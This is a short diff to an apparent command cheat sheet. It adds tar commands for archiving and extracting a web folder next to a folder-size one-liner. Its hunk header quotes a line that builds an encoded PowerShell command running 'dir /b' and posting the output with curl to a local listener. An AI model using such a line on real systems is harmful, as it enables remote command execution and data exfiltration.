@@ -33,3 +33,7 @@ echo -n '$r=cmd /c "dir /b";cmd /c curl 127.0.0.1:8877 --data "$r"' | iconv -f U
 
 # Calculate folder size
 Get-ChildItem -Path "C:\htdocs" -Recurse | Measure-Object -Property Length -Sum | ForEach-Object { $_.Sum / 1MB }
+
+# tar
+tar -cvzf htdocs.tar.gz "C:\htdocs"
+tar -zxvf htdocs.tar -C "D:\htdocs"
